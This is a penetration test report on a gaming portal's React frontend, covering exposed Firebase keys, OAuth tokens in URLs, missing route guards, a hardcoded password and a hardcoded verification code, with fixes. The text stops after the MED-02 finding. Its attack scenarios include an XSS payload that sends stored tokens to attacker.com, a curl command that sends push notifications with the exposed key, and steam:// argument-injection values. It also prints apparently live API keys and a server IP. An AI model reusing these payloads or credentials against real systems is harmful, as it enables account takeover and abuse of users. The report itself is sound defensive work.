# Penetration Test Report — BOS Games Frontend
**Date:** 2026-02-28
**Scope:** `/Users/marin.ranchev.ai/Projects/Audits/bos-games-test-fe`
**Tester:** Senior Penetration Tester (Authorized Code-Level Assessment)
**Methodology:** Static source-code analysis, data-flow tracing, threat modelling

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Vulnerability Matrix](#2-vulnerability-matrix)
3. [Detailed Findings](#3-detailed-findings)
   - [CRIT-01 Hardcoded Firebase API Key and VAPID Key in Source Code](#crit-01)
   - [CRIT-02 OAuth Token Exposed in URL Query Parameters](#crit-02)
   - [CRIT-03 No Protected Routes — Complete Authentication Bypass](#crit-03)
   - [CRIT-04 Hardcoded Production Server IP Address in Navigation Bar](#crit-04)
   - [HIGH-01 Tokens Stored in sessionStorage — XSS Token Theft](#high-01)
   - [HIGH-02 Hardcoded Default Password `Test123!` Across Registration and Login](#high-02)
   - [HIGH-03 Unauthenticated `getUserById` API Call — IDOR / User Enumeration](#high-03)
   - [HIGH-04 Client-Side Authentication Guard Only — Trivial Bypass](#high-04)
   - [HIGH-05 Unvalidated `steam://` Protocol Injection in `LiveMatch.tsx`](#high-05)
   - [HIGH-06 Hardcoded Email Verification Bypass Code `111111`](#high-06)
   - [MED-01 Mass Information Disclosure via 376 `console.log` Calls](#med-01)
   - [MED-02 Token Fragment Rendered in Dashboard UI](#med-02)
   - [MED-03 No Axios Request Interceptor — Token Passed Manually to Every Call](#med-03)
   - [MED-04 Device ID in sessionStorage — Trivially Forgeable Push Token Registration](#med-04)
   - [MED-05 Map-Ban `leaderId` Supplied by Client — Authorization Bypass](#med-05)
   - [MED-06 Matchmaking Race Condition — Double-Join Solo Queue](#med-06)
   - [MED-07 Firebase Config Duplicated in Publicly-Served Service Worker](#med-07)
   - [MED-08 `BackgroundMessageTest` Production Testing Utility Exposed in Bundle](#med-08)
   - [LOW-01 `getRecentMatches` Accepts Caller-Controlled `limit` Parameter](#low-01)
   - [LOW-02 `DeviceIdDisplay` Debug Component Rendered in Production Layout](#low-02)
   - [LOW-03 IP-Based Location Silently Tracked on Every Authenticated Page Load](#low-03)
   - [LOW-04 Missing `Referrer-Policy` — OAuth Token Leaked to Third-Party Scripts](#low-04)
4. [Remediation Plan](#4-remediation-plan)
5. [Appendix — Affected Files Quick Reference](#5-appendix)

---

## 1. Executive Summary

A full code-level penetration test of the BOS Games frontend (React 18 / TypeScript / Vite) was conducted on 2026-02-28. The application is a competitive gaming portal supporting Steam OAuth, party/team management, matchmaking, and real-time CS2 match tracking.

**5 Critical / High vulnerabilities** require immediate remediation before any production deployment. The most severe issues collectively allow an unauthenticated attacker to:

1. Authenticate as any user by injecting a crafted `accessToken` query parameter into the OAuth callback URL (no state/CSRF validation).
2. Fully bypass all route-level access controls (there are none — no `ProtectedRoute` wrapper exists anywhere in the routing tree).
3. Extract hardcoded Firebase credentials and a real game-server IP address directly from the shipped JavaScript bundle.
4. Steal any logged-in user's JWT by triggering an XSS payload (tokens live in `sessionStorage`, accessible via `document.sessionStorage` in any same-origin script).
5. Enumerate and access any user's profile without authentication through an unauthenticated `GET /users/:userId` endpoint.

Secondary concerns include 376 `console.log` statements shipping to production (many dumping full JWT payloads and server IPs), a hardcoded email-verification bypass code (`111111`), and a hardcoded default password (`Test123!`) used across both the registration and login flows.

**Overall Risk Rating: CRITICAL**

---

## 2. Vulnerability Matrix

| ID | Title | Severity | CVSS v3.1 (est.) | File(s) | Status |
|----|-------|----------|-----------------|---------|--------|
| CRIT-01 | Hardcoded Firebase API Key + VAPID Key | CRITICAL | 9.8 | `src/config/firebase.ts`, `public/firebase-messaging-sw.js` | Open |
| CRIT-02 | OAuth Token in URL Query Params | CRITICAL | 9.1 | `src/pages/Login.tsx`, `src/pages/SocialAuth.tsx`, `src/api/auth.ts` | Open |
| CRIT-03 | No Protected Routes | CRITICAL | 9.1 | `src/App.tsx` | Open |
| CRIT-04 | Hardcoded Production Server IP in Navbar | CRITICAL | 8.6 | `src/App.tsx` | Open |
| HIGH-01 | JWT in sessionStorage — XSS Token Theft | HIGH | 8.1 | `src/api/auth.ts`, all pages | Open |
| HIGH-02 | Hardcoded Password `Test123!` | HIGH | 8.0 | `src/pages/Login.tsx`, `src/pages/Register.tsx` | Open |
| HIGH-03 | Unauthenticated `getUserById` IDOR | HIGH | 7.5 | `src/api/user.ts` | Open |
| HIGH-04 | Client-Side Auth Guard Only | HIGH | 7.3 | `src/App.tsx`, all protected pages | Open |
| HIGH-05 | `steam://` Protocol Injection | HIGH | 7.1 | `src/pages/LiveMatch.tsx`, `src/components/ServerConnectionModal.tsx`, `src/utils/cs2-connection.ts` | Open |
| HIGH-06 | Hardcoded Email Verification Code `111111` | HIGH | 7.0 | `src/pages/Register.tsx` | Open |
| MED-01 | 376 `console.log` — Token / IP Disclosure | MEDIUM | 6.5 | Across all source files | Open |
| MED-02 | JWT Fragment Rendered in Dashboard UI | MEDIUM | 6.1 | `src/pages/Dashboard.tsx` | Open |
| MED-03 | No Axios Interceptor — Manual Token Passing | MEDIUM | 5.9 | All `src/api/*.ts` files | Open |
| MED-04 | Forgeable Device ID in sessionStorage | MEDIUM | 5.4 | `src/utils/device-id.ts` | Open |
| MED-05 | Client-Supplied `leaderId` in Map-Ban | MEDIUM | 5.3 | `src/api/map-banning.ts`, `src/components/MapBanningModal.tsx` | Open |
| MED-06 | Matchmaking Race Condition | MEDIUM | 5.1 | `src/api/party.ts`, `src/pages/Parties.tsx` | Open |
| MED-07 | Firebase Config in Public Service Worker | MEDIUM | 5.0 | `public/firebase-messaging-sw.js` | Open |
| MED-08 | `BackgroundMessageTest` in Production Bundle | MEDIUM | 4.8 | `src/utils/background-message-test.ts`, `src/App.tsx` | Open |
| LOW-01 | Caller-Controlled `limit` in Match Query | LOW | 3.7 | `src/api/match-statistics.ts`, `src/pages/MatchSelection.tsx` | Open |
| LOW-02 | `DeviceIdDisplay` Debug Widget in Production | LOW | 3.1 | `src/components/DeviceIdDisplay.tsx`, `src/App.tsx` | Open |
| LOW-03 | Silent IP-Based Location Tracking | LOW | 3.0 | `src/api/user.ts`, `src/App.tsx` | Open |
| LOW-04 | Missing Referrer-Policy Header | LOW | 2.9 | `index.html`, OAuth redirect flow | Open |

---

## 3. Detailed Findings

---

### CRIT-01
### Hardcoded Firebase API Key and VAPID Key in Source Code

**Severity:** CRITICAL
**CVSS v3.1 (estimate):** 9.8

#### Affected Files

| File | Lines |
|------|-------|
| `src/config/firebase.ts` | 2–19 |
| `public/firebase-messaging-sw.js` | 54–62 |

#### Evidence

```typescript
// src/config/firebase.ts  lines 2–19
export const firebaseConfig = {
  apiKey: "AIzaSyDUsEFOdlNO8muiTUx0Em65KY59Da_V_3A",
  authDomain: "bos-games-145f0.firebaseapp.com",
  projectId: "bos-games-145f0",
  storageBucket: "bos-games-145f0.firebasestorage.app",
  messagingSenderId: "303868662210",
  appId: "1:303868662210:web:8d737920e41afe8540065b",
  measurementId: "G-5NHMN87Z34",
};

export const vapidKey =
  "BKIlF0YS9FZix8JOnhkmfXQ2v5uItzP1wI_tNcQ14fr6yt8MX3da-3n7RtXiL_wzAIpSwvwmnL8qoy27cqLmPac";
```

The exact same block is duplicated verbatim inside the publicly-served service worker at `public/firebase-messaging-sw.js` lines 54–62, which is served without any authentication at `https://<domain>/firebase-messaging-sw.js`.

#### Attack Scenario

1. Attacker fetches `https://<production-domain>/firebase-messaging-sw.js` (no credentials required — service workers are always public).
2. Extracts `apiKey`, `projectId`, `appId`, and `messagingSenderId`.
3. Calls the Firebase Admin REST API or Firebase Cloud Messaging (FCM) HTTP v1 API using the extracted `apiKey`:
   - Enumerate all FCM topics (`GET https://iid.googleapis.com/iid/info/<token>?details=true&access_token=<apiKey>`).
   - Send arbitrary push notifications to all registered devices:
     ```bash
     curl -X POST \
       "https://fcm.googleapis.com/fcm/send" \
       -H "Authorization: key=AIzaSyDUsEFOdlNO8muiTUx0Em65KY59Da_V_3A" \
       -H "Content-Type: application/json" \
       -d '{
         "to": "/topics/all",
         "notification": {"title":"Match Found","body":""},
         "data": {"type":"match_found","matchId":"attacker-controlled-id"}
       }'
     ```
4. Every authenticated user's browser will display a "Match Found" modal with attacker-controlled `matchId`.
5. If the backend's match-acceptance endpoint does not validate match ownership, all players accept/decline a phantom match, disrupting the entire matchmaking system.
6. Additionally, the `projectId` (`bos-games-145f0`) combined with the `apiKey` could be used to access Firebase Storage and Firestore (if Security Rules are misconfigured), enumerate user registrations, or perform account takeover via Firebase Auth REST API password-reset flows.

#### Remediation

Firebase web API keys are intentionally designed to be public-facing identifiers — they are not secrets in the same sense as a private key. However, the attack surface is real if Firebase Security Rules are open. The correct remediation is two-fold:

1. **Enforce strict Firebase Security Rules** so the `apiKey` alone cannot be used to read/write data or send FCM messages to arbitrary topics.
2. **For FCM topic broadcast prevention**, restrict FCM send permissions to server-side only (use a private service account key on the backend, never in the frontend).
3. Move config values that control backend access into environment variables so they are absent from the Git history and the production bundle where possible:

```typescript
// SECURE — src/config/firebase.ts
export const firebaseConfig = {
  apiKey:            import.meta.env.VITE_FIREBASE_API_KEY,
  authDomain:        import.meta.env.VITE_FIREBASE_AUTH_DOMAIN,
  projectId:         import.meta.env.VITE_FIREBASE_PROJECT_ID,
  storageBucket:     import.meta.env.VITE_FIREBASE_STORAGE_BUCKET,
  messagingSenderId: import.meta.env.VITE_FIREBASE_MESSAGING_SENDER_ID,
  appId:             import.meta.env.VITE_FIREBASE_APP_ID,
  measurementId:     import.meta.env.VITE_FIREBASE_MEASUREMENT_ID,
};
export const vapidKey = import.meta.env.VITE_FIREBASE_VAPID_KEY;
```

4. **Rotate the VAPID key pair** immediately — the exposed public VAPID key is used to authenticate push subscriptions; with the associated private key (held server-side) this could be used to forge subscriptions.
5. Add the current `apiKey` to a secret-scanning pre-commit hook (e.g., `gitleaks`, `trufflehog`) to prevent future commits.

---

### CRIT-02
### OAuth Token Exposed in URL Query Parameters

**Severity:** CRITICAL
**CVSS v3.1 (estimate):** 9.1

#### Affected Files

| File | Lines |
|------|-------|
| `src/pages/Login.tsx` | 43–55, 57–77 |
| `src/pages/SocialAuth.tsx` | 11–27 |
| `src/api/auth.ts` | 108–123 |

#### Evidence

```typescript
// src/pages/Login.tsx  lines 43–55
useEffect(() => {
  const accessToken  = searchParams.get("accessToken");   // JWT in URL
  const refreshToken = searchParams.get("refreshToken");  // refresh token in URL
  const error        = searchParams.get("error");
  ...
  if (accessToken) {
    handleSocialAuthSuccess(accessToken, refreshToken || undefined);
  }
}, [searchParams]);
```

```typescript
// src/pages/SocialAuth.tsx  lines 11–27
const accessToken  = searchParams.get("accessToken");
const refreshToken = searchParams.get("refreshToken");
...
handleAuthSuccess(accessToken, refreshToken || undefined);
```

```typescript
// src/api/auth.ts  lines 108–123
export async function handleSocialAuthCallback(
  accessToken: string,
  refreshToken?: string
) {
  sessionStorage.setItem("token", accessToken);
  ...
}
```

The Steam OAuth callback redirects the user's browser to:
```
https://<domain>/login?accessToken=eyJhb...&refreshToken=eyJhb...
```
or
```
https://<domain>/auth/social?accessToken=eyJhb...&refreshToken=eyJhb...
```

#### Attack Scenario

**Scenario A — Referrer leakage:**
If any third-party script is loaded on the login page (analytics, CDN-hosted assets), the browser automatically includes the full URL (including query string) in the `Referer` request header sent to that third party. The attacker's server receives the JWT.

**Scenario B — Browser history theft:**
The token is stored in browser history. On a shared computer, any user who opens History can copy the URL and replay the token.

**Scenario C — Server-Side Request Forgery (SSRF) / Log injection:**
Web server access logs, reverse proxy logs, and CDN logs record query parameters by default. An attacker with access to any of these logs extracts all JWT tokens.

**Scenario D — OAuth state-parameter CSRF:**
There is no `state` parameter generated or validated in the client-side OAuth flow. An attacker can craft a malicious link:
```
https://<domain>/login?accessToken=<victim-jwt>
```
and trick the victim into loading it, making the victim's session use the attacker's token (session fixation variant).

**Proof of Concept:**
```
# Attacker craft URL — forces victim browser to load attacker's token as their session
https://bosgames.example.com/login?accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlci11c2VyLWlkIn0.SIG
```

#### Remediation

Tokens must never appear in URLs. The correct pattern is to use a short-lived one-time authorization code and exchange it for a token on the client after the redirect, or deliver tokens via `postMessage` from a pop-up window.

```typescript
// SECURE pattern — exchange a short-lived code, not a raw token
// Backend redirects to: /auth/social?code=<one-time-code>  (not a JWT)
// Frontend exchanges the code for tokens via a POST

useEffect(() => {
  const code  = searchParams.get("code");
  const state = searchParams.get("state");

  // Validate CSRF state parameter
  const savedState = sessionStorage.getItem("oauth_state");
  if (!state || state !== savedState) {
    setError("Invalid OAuth state. Possible CSRF attack.");
    return;
  }
  sessionStorage.removeItem("oauth_state");

  if (code) {
    exchangeCodeForToken(code).then(({ accessToken, refreshToken }) => {
      // store tokens, redirect
    });
  }
}, [searchParams]);
```

---

### CRIT-03
### No Protected Routes — Complete Authentication Bypass

**Severity:** CRITICAL
**CVSS v3.1 (estimate):** 9.1

#### Affected Files

| File | Lines |
|------|-------|
| `src/App.tsx` | 1416–1439 |
| `src/pages/Dashboard.tsx` | 43–53 |
| `src/pages/Parties.tsx` | 48–53 |
| `src/pages/Friends.tsx` | 26–32 |

#### Evidence

```typescript
// src/App.tsx  lines 1416–1439  — ALL routes are public
<Routes>
  <Route path="/"              element={<Navigate to={isAuthenticated ? "/dashboard" : "/login"} />} />
  <Route path="/register"      element={<Register />} />
  <Route path="/login"         element={<Login />} />
  <Route path="/auth/social"   element={<SocialAuth />} />
  <Route path="/dashboard"     element={<Dashboard />} />    {/* NO auth guard */}
  <Route path="/friends"       element={<Friends />} />      {/* NO auth guard */}
  <Route path="/teams"         element={<Teams />} />        {/* NO auth guard */}
  <Route path="/parties"       element={<Parties />} />      {/* NO auth guard */}
  <Route path="/hardware"      element={<HardwareProfile />}/>{/* NO auth guard */}
  <Route path="/notifications" element={<Notifications />} />{/* NO auth guard */}
  <Route path="/live-matches"  element={<LiveMatches />} />  {/* NO auth guard */}
  <Route path="/live-match/:matchId" element={<LiveMatchPage />} />{/* NO auth guard */}
  <Route path="/match-selection"     element={<MatchSelection />} />{/* NO auth guard */}
  <Route path="/match-statistics/:matchId" element={<MatchStatistics />} />{/* NO auth guard */}
</Routes>
```

Each individual page component performs a soft check on `sessionStorage.getItem("token")` and either shows a "Not logged in" message or conditionally redirects — but the component renders and begins API calls before this check completes. An attacker can navigate directly to any route without a token.

#### Attack Scenario

1. Open browser, clear all cookies and storage.
2. Navigate directly to `https://<domain>/dashboard`.
3. The Dashboard component renders. It calls `getMe(token)` where `token = null`. The API call fails, the component shows "Not logged in" — but the page is fully rendered and JS state is fully initialized.
4. Navigate to `https://<domain>/parties`. With an empty token string `""`, `createParty` and similar functions are called with `Authorization: Bearer ` (empty Bearer token). Depending on backend validation strictness, some endpoints may process the request.
5. Navigate to `https://<domain>/live-match/SOME-MATCH-UUID` — the page renders and attempts to call `getLiveMatch(matchId, null)` which will likely return an error, but the component is fully rendered and responsive.

#### Remediation

Create a `ProtectedRoute` higher-order component:

```typescript
// src/components/ProtectedRoute.tsx
import React from "react";
import { Navigate, useLocation } from "react-router-dom";

interface ProtectedRouteProps {
  children: React.ReactNode;
}

export const ProtectedRoute: React.FC<ProtectedRouteProps> = ({ children }) => {
  const token = sessionStorage.getItem("token");
  const location = useLocation();

  if (!token) {
    return <Navigate to="/login" state={{ from: location }} replace />;
  }

  return <>{children}</>;
};
```

```typescript
// src/App.tsx — wrap all protected routes
<Route path="/dashboard"   element={<ProtectedRoute><Dashboard /></ProtectedRoute>} />
<Route path="/friends"     element={<ProtectedRoute><Friends /></ProtectedRoute>} />
<Route path="/teams"       element={<ProtectedRoute><Teams /></ProtectedRoute>} />
<Route path="/parties"     element={<ProtectedRoute><Parties /></ProtectedRoute>} />
// ... all other private routes
```

---

### CRIT-04
### Hardcoded Production Server IP Address in Navigation Bar

**Severity:** CRITICAL
**CVSS v3.1 (estimate):** 8.6

#### Affected Files

| File | Line |
|------|------|
| `src/App.tsx` | 1366 |

#### Evidence

```typescript
// src/App.tsx  line 1366
const steamUrl = `steam://run/730//+connect 156.146.52.210:26952 -novid`;
```

A real, publicly-routable game-server IP address (`156.146.52.210`) and port (`26952`) is hardcoded directly in the production navigation bar button labelled "Test Server". This is rendered to every authenticated user.

#### Attack Scenario

1. Attacker opens DevTools on any authenticated page and reads the JS source, or reads the source file directly from the Git repository.
2. Attacker now has the game server's public IP and port.
3. Attacker launches a volumetric UDP flood (DDoS) targeting `156.146.52.210:26952` to disrupt all active matches.
4. Attacker connects to the server directly without going through matchmaking, potentially spectating or disrupting live ranked matches.
5. Attacker performs OS fingerprinting, version enumeration, and vulnerability scanning against the exposed CS2 SRCDS server.

#### Remediation

Remove the hardcoded IP entirely. If a test-server button is needed in development, gate it behind a feature flag:

```typescript
// SECURE — remove the hardcoded IP; use environment variable + feature flag
{import.meta.env.VITE_SHOW_TEST_SERVER === "true" && import.meta.env.VITE_TEST_SERVER_IP && (
  <button onClick={() => {
    const steamUrl = `steam://run/730//+connect ${import.meta.env.VITE_TEST_SERVER_IP}:${import.meta.env.VITE_TEST_SERVER_PORT} -novid`;
    window.location.href = steamUrl;
  }}>
    Test Server
  </button>
)}
```

Ensure `VITE_SHOW_TEST_SERVER` is set to `"false"` (or absent) in all production build pipelines.

---

### HIGH-01
### JWT Stored in `sessionStorage` — Accessible to XSS Payloads

**Severity:** HIGH
**CVSS v3.1 (estimate):** 8.1

#### Affected Files

| File | Lines |
|------|-------|
| `src/api/auth.ts` | 113, 120, 132–133 |
| `src/pages/Login.tsx` | 90–91 |
| `src/pages/Friends.tsx` | 58 |
| All page components | Various |

#### Evidence

```typescript
// src/api/auth.ts  line 113
sessionStorage.setItem("token", accessToken);
sessionStorage.setItem("user", JSON.stringify(user));

// src/pages/Login.tsx  lines 90–91
sessionStorage.setItem("token", token);
sessionStorage.setItem("user", JSON.stringify(user));

// src/pages/Friends.tsx  line 58
sessionStorage.setItem("userId", currentUserData.id);
```

`sessionStorage` is fully readable by any JavaScript running in the same origin via `sessionStorage.getItem("token")`. Unlike `httpOnly` cookies, it offers no protection against XSS.

#### Attack Scenario

1. Attacker finds any XSS vector in the application (e.g., via a user-controlled nickname displayed without sanitization, or a third-party script compromise).
2. Attacker's payload executes:
   ```javascript
   fetch("https://attacker.com/steal?t=" + encodeURIComponent(sessionStorage.getItem("token")));
   ```
3. Attacker receives the victim's JWT and can authenticate as that user from any device until the token expires.
4. Since the app also stores `sessionStorage.getItem("userId")` and the full `user` JSON blob, the attacker additionally obtains the user's ID, email, and profile data.

#### Remediation

The most secure approach is to store the access token in an `httpOnly` cookie managed by the backend. If SPA architecture prevents this, the minimum mitigation is:

1. Do not store the full token in `sessionStorage` — store it only in memory (React context/state).
2. Store a non-sensitive refresh token in an `httpOnly` cookie and exchange it for access tokens transparently.
3. Implement Content Security Policy to reduce XSS surface area.

```typescript
// SECURE pattern — in-memory token store
// src/context/AuthContext.tsx
import React, { createContext, useContext, useState } from "react";

interface AuthContextType {
  token: string | null;
  setToken: (t: string | null) => void;
}
const AuthContext = createContext<AuthContextType>({ token: null, setToken: () => {} });

export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [token, setToken] = useState<string | null>(null);
  return <AuthContext.Provider value={{ token, setToken }}>{children}</AuthContext.Provider>;
};

export const useAuth = () => useContext(AuthContext);
// Access token lives only in JS heap — not accessible to sessionStorage-reading XSS payloads
```

---

### HIGH-02
### Hardcoded Default Password `Test123!` Across Register and Login

**Severity:** HIGH
**CVSS v3.1 (estimate):** 8.0

#### Affected Files

| File | Line | Context |
|------|------|---------|
| `src/pages/Register.tsx` | 19 | `const [password] = useState("Test123!")` |
| `src/pages/Login.tsx` | 18 | `const [password] = useState("Test123!")` |

#### Evidence

```typescript
// src/pages/Register.tsx  line 19
const [password] = useState("Test123!");

// src/pages/Login.tsx  line 18
const [password] = useState("Test123!");

// src/pages/Login.tsx  line 218 — rendered read-only in UI
<input type="password" value={password} readOnly ... />
<span className="text-xs text-gray-500">(Auto-filled for demo)</span>
```

The registration flow auto-registers new accounts with the fixed password `Test123!`. The login page pre-fills this same password with the note "Auto-filled for demo". Since the registration flow generates random email addresses and auto-submits the entire registration sequence, any account created through this UI uses the same password.

#### Attack Scenario

1. Attacker calls `GET /users` with a valid token (or enumerates via the unauthenticated `getUserById` endpoint) to collect registered email addresses.
2. Attacker submits a credential-stuffing attack against `POST /auth/login/email` for each email with password `Test123!`.
3. Most accounts created through the registration page will be compromised immediately.

#### Remediation

Remove all hardcoded passwords from source code. For testing purposes, use a dedicated test-account credentials file that is excluded from version control, or implement a developer-only `.env`-driven override:

```typescript
// SECURE
const [password, setPassword] = useState("");
// No default. User must enter their own password.
// For internal testing: load from VITE_TEST_PASSWORD env var, never hardcode.
```

---

### HIGH-03
### Unauthenticated `getUserById` — IDOR and User Enumeration

**Severity:** HIGH
**CVSS v3.1 (estimate):** 7.5

#### Affected Files

| File | Lines |
|------|-------|
| `src/api/user.ts` | 21–24 |

#### Evidence

```typescript
// src/api/user.ts  lines 21–24
export async function getUserById(userId: string) {
  const resp = await axios.get(`${API_BASE_URL}/users/${userId}`);
  // NO Authorization header — no token passed
  return resp.data;
}
```

The `getUserById` function makes a `GET /users/:userId` request **without any `Authorization` header**. If the backend honours this request (no authentication required on that endpoint), any anonymous caller can retrieve the profile of any user whose UUID they know or can enumerate.

#### Attack Scenario

1. Attacker calls `GET https://api.bosgames.example.com/users/00000000-0000-0000-0000-000000000001` without any token.
2. If the server returns a 200 response, the attacker iterates through UUIDs or guesses well-known user IDs from public match data.
3. Attacker harvests email addresses, nicknames, Steam IDs, country codes, and other PII for all users.

**Proof of Concept:**
```bash
curl -s "https://api.bosgames.example.com/users/SOME-USER-UUID"
# Expected (vulnerable): {"id":"...","email":"user@example.com","nickname":"...","steamId":"..."}
# Expected (secure):     {"statusCode":401,"message":"Unauthorized"}
```

#### Remediation

Always pass the authentication token:

```typescript
// SECURE
export async function getUserById(userId: string, token: string) {
  const resp = await axios.get(`${API_BASE_URL}/users/${userId}`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  return resp.data;
}
```

Additionally, enforce authentication at the backend for all `/users/:id` routes unless the endpoint is explicitly designed to be public.

---

### HIGH-04
### Client-Side Authentication Guard Only — Trivially Bypassed

**Severity:** HIGH
**CVSS v3.1 (estimate):** 7.3

#### Affected Files

| File | Lines | Pattern |
|------|-------|---------|
| `src/pages/Parties.tsx` | 48–53 | `if (!token) { navigate("/login"); return; }` |
| `src/pages/Friends.tsx` | 26–32 | Same pattern |
| `src/pages/Dashboard.tsx` | 14–27 | Check inside `useEffect` — asynchronous |

#### Evidence

```typescript
// src/pages/Parties.tsx  lines 48–53
useEffect(() => {
  if (!token) {
    navigate("/login");
    return;
  }
}, [token, navigate]);
```

The navigation to `/login` happens inside a `useEffect`, which runs **after** the component has rendered and all child components have mounted. Before the redirect fires:

- All API calls in the page's `useEffect` hooks have already been dispatched.
- The component's full JSX tree has been rendered into the DOM.
- Any sensitive data returned from APIs before the redirect has been briefly displayed or loaded into state.

#### Attack Scenario

1. An attacker with a stale/expired token navigates to `/parties`.
2. The component renders, all `Promise.all([getMyParties, getPartyInvites, getAllTeams, ...])` calls fire with the expired token.
3. If any of those API endpoints return stale cached data or accept expired tokens, the attacker sees party/team/matchmaking state.
4. Even if the API correctly rejects with 401, there is a brief window during which the component is mounted and rendering.

#### Remediation

Authentication checks should happen synchronously **before** the component renders (at the router level via `ProtectedRoute`) rather than inside `useEffect`. See remediation for CRIT-03.

---

### HIGH-05
### Unvalidated `steam://` Protocol Injection via Server IP

**Severity:** HIGH
**CVSS v3.1 (estimate):** 7.1

#### Affected Files

| File | Lines |
|------|-------|
| `src/pages/LiveMatch.tsx` | 604 |
| `src/components/ServerConnectionModal.tsx` | 60 |
| `src/utils/cs2-connection.ts` | 17 |

#### Evidence

```typescript
// src/pages/LiveMatch.tsx  line 604
const steamUrl = `steam://run/730//+connect ${matchStats.serverIp}:${matchStats.serverPort} -novid`;
window.location.href = steamUrl;

// src/utils/cs2-connection.ts  line 17
const steamUrl = `steam://run/730//+connect ${serverIp}:${serverPort} -novid`;
window.location.href = steamUrl;
```

`serverIp` and `serverPort` are values returned from the backend API (`GET /live-matches/:matchId`) and injected directly into a `steam://` protocol URL without any validation or sanitisation.

#### Attack Scenario

**Scenario A — Backend compromise / MitM:**
If an attacker can intercept or modify the API response (e.g., via a compromised CDN, DNS poisoning, or backend vulnerability), they can inject a malicious IP and port into the `serverIp` field. When the victim clicks "Join Match", their Steam client is redirected to an attacker-controlled server. In the CS2 client, connecting to a malicious game server can trigger client-side exploits (historically common in Source Engine games).

**Scenario B — Steam URI argument injection:**
If `serverIp` contains spaces or special characters and the backend does not sanitize it, an attacker may inject additional Steam launch arguments:

```
serverIp = "127.0.0.1 -applaunch 730 +exec malicious"
// Resulting URL:
steam://run/730//+connect 127.0.0.1 -applaunch 730 +exec malicious:27015 -novid
```

**Proof of Concept (backend-response manipulation):**
```json
// Malicious API response for GET /live-matches/match-id
{
  "serverIp": "192.168.1.1 -exec phish +map workshop",
  "serverPort": "27015"
}
```

#### Remediation

Validate `serverIp` against a strict IPv4/IPv6 regex and `serverPort` as an integer in range 1024–65535 before constructing the URL. Never interpolate API-returned strings into protocol handler URLs without validation:

```typescript
// SECURE
const isValidIPv4 = (ip: string) => /^(\d{1,3}\.){3}\d{1,3}$/.test(ip) &&
  ip.split(".").every(seg => parseInt(seg) <= 255);
const isValidPort = (port: number) => Number.isInteger(port) && port >= 1024 && port <= 65535;

if (!isValidIPv4(matchStats.serverIp!) || !isValidPort(matchStats.serverPort!)) {
  setError("Invalid server connection details received.");
  return;
}
const steamUrl = `steam://run/730//+connect ${matchStats.serverIp}:${matchStats.serverPort} -novid`;
```

---

### HIGH-06
### Hardcoded Email Verification Bypass Code `111111`

**Severity:** HIGH
**CVSS v3.1 (estimate):** 7.0

#### Affected Files

| File | Line |
|------|------|
| `src/pages/Register.tsx` | 31 |

#### Evidence

```typescript
// src/pages/Register.tsx  line 31
// Demo: Simulate code (in real backend, fetch code from email, or expose for test/dev)
const devCode = "111111";
```

```typescript
// src/pages/Register.tsx  line 48
const { token: verifyToken } = await verifyEmail(devCode, accountToken);
```

The email verification step is bypassed using the hardcoded six-digit code `111111`. If the backend accepts this code in any environment (development, staging, or production), any attacker can register unlimited accounts without controlling a valid email address by simply submitting `111111` as the verification code.

#### Attack Scenario

1. Attacker calls `POST /auth/register/account` with an arbitrary email (e.g., `victim@company.com`) — they do not control this mailbox.
2. Attacker immediately calls `POST /auth/register/verify-email` with `{ "code": "111111" }` using the token from step 1.
3. If the backend accepts `111111`, the account is verified and a full access token is returned.
4. Attacker now has a fully verified account on an email address they do not own — useful for phishing, impersonation, or bypassing email-based rate limits.
5. This also enables unlimited automated account creation (sockpuppet farms for matchmaking manipulation).

#### Remediation

Remove the hardcoded `devCode` from all source code. The registration flow should require the user to enter the code received in their actual email:

```typescript
// SECURE
const [verificationCode, setVerificationCode] = useState("");
// ... render an input for the user to type the code from their email
// ... call verifyEmail(verificationCode, accountToken) on submit
```

For automated integration testing, inject test codes via test-only backend endpoints that are inaccessible in production, not via client-side hardcoding.

---

### MED-01
### Mass Information Disclosure via 376 `console.log` Calls

**Severity:** MEDIUM
**CVSS v3.1 (estimate):** 6.5

#### Affected Files

All source files. Notable examples:

| File | Line | Sensitive Data Logged |
|------|------|----------------------|
| `src/pages/Login.tsx` | 87 | `console.log("user", user)` — full user object including email |
| `src/pages/Dashboard.tsx` | 14 | `console.log("token", token)` — full JWT logged to console |
| `src/utils/push-notifications.ts` | 385–388 | Firebase token, device ID, platform logged together |
| `src/pages/LiveMatch.tsx` | 606–609 | `serverIp`, `serverPort`, `steamUrl` logged |
| `src/utils/cs2-connection.ts` | 19–23 | Same as above |
| `src/utils/push-notifications.ts` | 432–433 | Full VAPID key logged on error |
| `public/firebase-messaging-sw.js` | 73 | Full push notification payload logged |
| `src/App.tsx` | 87–88 | `user` and `locationResult` logged |

Total: **270 `console.log` calls in TypeScript source**, **106 in the service worker** = **376 total**.

#### Attack Scenario

1. In any modern browser, **other extensions and injected scripts can read the browser console**. Malicious extensions (e.g., adware, browser hijackers) commonly exfiltrate DevTools console output.
2. When a support agent asks a user to "open DevTools and take a screenshot", the screenshot captures JWTs and server IPs logged to console.
3. Error monitoring services (Sentry, LogRocket, DataDog RUM) that capture console output will store JWTs and server IPs in third-party cloud infrastructure.
4. When debugging with remote DevTools (`chrome://inspect`), console logs are transmitted over the debugging protocol — potentially over an unencrypted WebSocket.

#### Remediation

Strip all `console.log` calls from production builds. A two-step approach:

1. Use Vite's `define` to replace `console.log` in production:
```typescript
// vite.config.ts
export default defineConfig({
  esbuild: {
    drop: ["console", "debugger"],  // removes all console.* calls in production build
  },
});
```
2. For logs that are genuinely needed (errors and warnings), replace `console.log` with a structured logger that is configurable and disabled in production:
```typescript
// src/utils/logger.ts
const isDev = import.meta.env.DEV;
export const logger = {
  debug: (...args: unknown[]) => isDev && console.debug(...args),
  warn:  (...args: unknown[]) => console.warn(...args),
  error: (...args: unknown[]) => console.error(...args),
};
```

---

### MED-02
### JWT Fragment Rendered in Dashboard UI

**Severity:** MEDIUM
**CVSS v3.1 (estimate):** 6.1

#### Affected Files

| File | Line |
|------|------|
| `src/pages/Dashboard.tsx` | 123–125 |

#### Evidence

```typescript
// src/pages/Dashboard.tsx  lines 122–125
<div className="text-xs text-gray-500">
  <p>
    <strong>JWT Token:</strong> {token.substring(0, 20)}...
  </p>
</div>
```

